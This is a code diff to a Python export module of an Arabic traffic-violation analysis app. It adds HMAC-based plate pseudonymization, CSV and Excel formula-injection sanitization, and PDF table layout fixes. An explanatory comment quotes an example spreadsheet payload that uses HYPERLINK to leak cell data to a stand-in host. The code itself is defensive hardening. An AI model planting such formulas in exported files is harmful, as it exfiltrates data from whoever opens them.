@@ -4,19 +4,30 @@ from __future__ import annotations
 
 import csv
 import hashlib
+import hmac
 import json
 import logging
 import os
 from dataclasses import asdict, replace
 from datetime import datetime
 from pathlib import Path
-from typing import Any
+from typing import Any, Final
 
 from app.config import PROJECT_ROOT
 from app.constants import SOURCE_ARABIC_NAMES, VIOLATION_ARABIC_NAMES, SourceType, ViolationType
 from app.core.dashboard import DashboardService, ViolationRow
 
 logger = logging.getLogger(__name__)
+
+# سنتيمتر واحد بوحدة reportlab (نقطة = 1/72 بوصة). معرَّف هنا بدل
+# `from reportlab.lib.units import cm` على مستوى الوحدة حتى يبقى استيراد
+# reportlab **كسولاً**: `export_csv` و`export_json` تعملان بلا تثبيته.
+# قيم `colWidths` كانت أرقاماً مجرّدة — أي **نقاطاً**: عمود بعرض 8 نقاط
+# (0.42 سم) داخل 17 سم متاحة، فالنص يفيض فوق الحدود ويتراكب.
+CM: Final[float] = 72.0 / 2.54
+
+# سقف صفوف جدول المخالفات في التقرير — يُعرض مع الإجمالي بدل بتر صامت
+PDF_VIOLATIONS_LIMIT: Final[int] = 30
 
 # مسارات مرشّحة لخط عربي يدعم التشكيل — أول موجود يُستخدم في PDF
 _SYSTEM_ARABIC_FONT_CANDIDATES: tuple[str, ...] = (
@@ -87,6 +98,7 @@ def _register_arabic_font() -> str | None:
 # ملح ثابت للتجهيل داخل الدراسة الواحدة: يجعل نفس اللوحة تُعطي نفس الرمز
 # (فتبقى التحليلات «كم مخالفة لنفس المركبة؟» ممكنة) دون كشف الرقم نفسه.
 _DEFAULT_SALT_ENV = "BASEER_ANON_SALT"
+_DEFAULT_SALT_FALLBACK = "baseer-default-salt"
 
 
 def anonymization_salt() -> str:
@@ -95,11 +107,18 @@ def anonymization_salt() -> str:
     if env_value:
         return env_value
     try:
-        from app.config import get_settings
+        from app.config import DEFAULT_ANON_SALT, get_settings
 
-        return get_settings().anon_salt
+        salt = get_settings().anon_salt
+        if salt == DEFAULT_ANON_SALT:
+            logger.warning(
+                "التجهيل يستعمل الملح الافتراضي المنشور — الرموز المُصدَّرة قابلة "
+                "للعكس بجدول أقواس. شغّل التطبيق مرة ليولّد ملحاً خاصاً، أو عيّن "
+                "BASEER_ANON_SALT بقيمة عشوائية."
+            )
+        return salt
     except Exception:  # noqa: BLE001 - لا نُسقط التصدير على إعدادات معطوبة
-        return "baseer-default-salt"
+        return _DEFAULT_SALT_FALLBACK
 
 
 def pseudonymize_plate(plate: str | None, *, salt: str | None = None) -> str | None:
@@ -108,10 +127,18 @@ def pseudonymize_plate(plate: str | None, *, salt: str | None = None) -> str | N
     الدراسة الإحصائية (توزيع المخالفات على الأنواع والساعات) **لا تحتاج أرقام
     اللوحات أصلاً**، بينما تصديرها يجعل ملف CSV سجلاً شخصياً كاملاً يربط مركبات
     محدَّدة بأوقات ومواقع. الرمز المستعار يحفظ قابلية التجميع ويُسقط الهوية.
+
+    **HMAC بمفتاح سرّي، لا هاش عادي**: `sha256("salt::plate")` قابل للعكس تماماً
+    متى عُرف الملح، لأن فضاء اللوحة السعودية (3–4 أرقام + 2–4 حروف من 17) لا
+    يتجاوز ≈10⁷–10⁸ احتمالاً — يُعدّ بالكامل على لابتوب في ثوانٍ. الأمان هنا
+    يقوم على **سرّية المفتاح** لا على صعوبة الدالة، ولهذا يولّد
+    `config.ensure_anon_salt()` ملحاً عشوائياً خاصاً بكل تثبيت؛ ومع الملح
+    الافتراضي المنشور يبقى العكس ممكناً (تُحذّر الواجهة قبل التصدير).
     """
     if not plate:
         return None
-    digest = hashlib.sha256(f"{salt or anonymization_salt()}::{plate}".encode()).hexdigest()
+    key = (salt or anonymization_salt()).encode()
+    digest = hmac.new(key, plate.encode(), hashlib.sha256).hexdigest()
     return f"PLATE-{digest[:10].upper()}"
 
 
@@ -180,6 +207,29 @@ def _json_default(value: object) -> str:
 
 
 # ============================================
+# تنقية خلايا الجداول (Formula Injection)
+# ============================================
+# Excel و Google Sheets و LibreOffice تُقيّم أي خلية تبدأ بـ`=` أو `+` أو `-`
+# أو `@` كصيغة. حقول المخالفة تأتي من نص حرّ (`notes` من الحوار اليدوي)، ومن
+# OCR، ومن اسم ملف يتحكم به من أرسل المقطع — فقيمة مثل
+# `=HYPERLINK("http://x/?"&A1,"اضغط")` تُحوّل «تصدير دراسة» إلى قناة تسريب
+# بيانات أو تنفيذ (DDE) على جهاز **من يفتح التقرير**: باحث أو جهة أخرى، لا من
+# ولّد الملف. الفاصلة العليا البادئة تجعل الخلية نصاً صريحاً ولا تظهر للقارئ.
+# مرجع: OWASP CSV Injection.
+_FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")
+
+
+def sanitize_cell(value: Any) -> Any:
+    """يُبطل تقييم الصيغ: يسبق كل نص يبدأ ببادئة خطرة بفاصلة عليا.
+
+    غير النصوص تُمرَّر كما هي (الأرقام والتواريخ لا تُقيَّم كصيغ).
+    """
+    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
+# ============================================
 # CSV
 # ============================================
 CSV_COLUMNS: tuple[str, ...] = (
@@ -205,7 +255,7 @@ def export_csv(violations: list[ViolationRow], output_path: Path | str) -> Path:
         writer = csv.DictWriter(fp, fieldnames=CSV_COLUMNS)
         writer.writeheader()
         for v in violations:
-            row = {col: getattr(v, col, "") for col in CSV_COLUMNS}
+            row = {col: sanitize_cell(getattr(v, col, "")) for col in CSV_COLUMNS}
             writer.writerow(row)
     return out
 
@@ -246,7 +296,7 @@ def export_excel(
     by_type_sheet = wb.create_sheet("حسب النوع")
     by_type_sheet.append(["النوع (الكود)", "النوع (عربي)", "العدد"])
     for vtype, count in study.get("by_type", []):
-        by_type_sheet.append([vtype, _violation_arabic_name(vtype), count])
+        by_type_sheet.append([sanitize_cell(vtype), _violation_arabic_name(vtype), count])
 
     # By hour sheet
     by_hour_sheet = wb.create_sheet("حسب الساعة")
@@ -254,11 +304,11 @@ def export_excel(
     for hour, count in study.get("by_hour", []):
         by_hour_sheet.append([hour, count])
 
-    # Details sheet
+    # Details sheet — كل قيمة نصية مُنقّاة من الصيغ قبل الكتابة
     details = wb.create_sheet("التفاصيل")
     details.append(list(CSV_COLUMNS))
     for v in violations:
-        details.append([getattr(v, col, "") for col in CSV_COLUMNS])
+        details.append([sanitize_cell(getattr(v, col, "")) for col in CSV_COLUMNS])
 
     wb.save(out)
     return out
@@ -278,7 +328,6 @@ def export_pdf(
     try:
         from reportlab.lib.pagesizes import A4
         from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
-        from reportlab.lib.units import cm
         from reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer
     except ImportError as exc:
         raise RuntimeError("يحتاج reportlab — ثبّت requirements.txt") from exc
@@ -289,10 +338,10 @@ def export_pdf(
     doc = SimpleDocTemplate(
         str(out),
         pagesize=A4,
-        rightMargin=2 * cm,
-        leftMargin=2 * cm,
-        topMargin=2 * cm,
-        bottomMargin=2 * cm,
+        rightMargin=2 * CM,
+        leftMargin=2 * CM,
+        topMargin=2 * CM,
+        bottomMargin=2 * CM,
         title="Baseer Study",
     )
 
@@ -328,8 +377,10 @@ def export_pdf(
     story.append(Spacer(1, 12))
 
     if violations:
-        story.append(Paragraph(_shape("أحدث المخالفات (آخر 30)"), rtl_style))
-        story.append(_violations_table(violations[:30], arabic_font))
+        shown = violations[:PDF_VIOLATIONS_LIMIT]
+        caption = f"أحدث المخالفات: {len(shown)} من {len(violations)}"
+        story.append(Paragraph(_shape(caption), rtl_style))
+        story.append(_violations_table(shown, arabic_font))
 
     doc.build(story)
     return out
@@ -345,7 +396,7 @@ def _kpi_table(kpis: dict[str, Any], font: str | None = None) -> object:
         [_shape("إجمالي المخالفات"), str(kpis.get("total_violations", 0))],
         [_shape("متوسط مخالفات/مقطع"), f"{kpis.get('avg_violations_per_video', 0.0):.2f}"],
     ]
-    table = Table(data, colWidths=[8, 4], hAlign="RIGHT")
+    table = Table(data, colWidths=[8 * CM, 4 * CM], hAlign="RIGHT")
     table.setStyle(_default_table_style(colors, font))
     return table
 
@@ -357,7 +408,7 @@ def _by_type_table(by_type: list[Any], font: str | None = None) -> object:
     data = [[_shape("النوع"), _shape("العدد")]]
     for vtype, count in by_type:
         data.append([_shape(_violation_arabic_name(vtype)), str(count)])
-    table = Table(data, colWidths=[10, 3], hAlign="RIGHT")
+    table = Table(data, colWidths=[9 * CM, 3 * CM], hAlign="RIGHT")
     table.setStyle(_default_table_style(colors, font))
     return table
 
@@ -366,6 +417,7 @@ def _violations_table(violations: list[ViolationRow], font: str | None = None) -
     from reportlab.lib import colors
     from reportlab.platypus import Table
 
+    cell = _cell_style(font)
     data = [
         [
             _shape("الملف"),
@@ -375,17 +427,38 @@ def _violations_table(violations: list[ViolationRow], font: str | None = None) -
         ]
     ]
     for v in violations:
+        # أسماء الملفات طويلة: `Paragraph` يلتف داخل الخلية بدل الفيض فوق الحدود
         data.append(
             [
-                _shape(v.video_filename),
-                _shape(v.violation_type_ar),
+                _paragraph(v.video_filename, cell),
+                _paragraph(v.violation_type_ar, cell),
                 f"{v.confidence:.2f}",
-                _shape(v.review_status),
+                _paragraph(v.review_status, cell),
             ]
         )
-    table = Table(data, colWidths=[6, 4, 2, 3], hAlign="RIGHT")
+    table = Table(data, colWidths=[6.5 * CM, 4 * CM, 2 * CM, 3.5 * CM], hAlign="RIGHT")
     table.setStyle(_default_table_style(colors, font))
     return table
+
+
+def _cell_style(font: str | None) -> Any:
+    """نمط خلية RTL للجداول الطويلة."""
+    from reportlab.lib.styles import ParagraphStyle
+
+    return ParagraphStyle(
+        "cell_rtl",
+        alignment=2,  # right
+        fontName=font or "Helvetica",
+        fontSize=9,
+        leading=12,
+    )
+
+
+def _paragraph(text: str, style: Any) -> Any:
+    """خلية نصية تلتف — تُبنى بعد تشكيل العربية."""
+    from reportlab.platypus import Paragraph
+
+    return Paragraph(_shape(text or "—"), style)
 
 
 def _default_table_style(colors_module: Any, font: str | None = None) -> object:
@@ -450,6 +523,7 @@ def record_export(
 
 __all__ = [
     "anonymization_salt",
+    "sanitize_cell",
     "anonymize_study",
     "anonymize_violation_rows",
     "build_study",
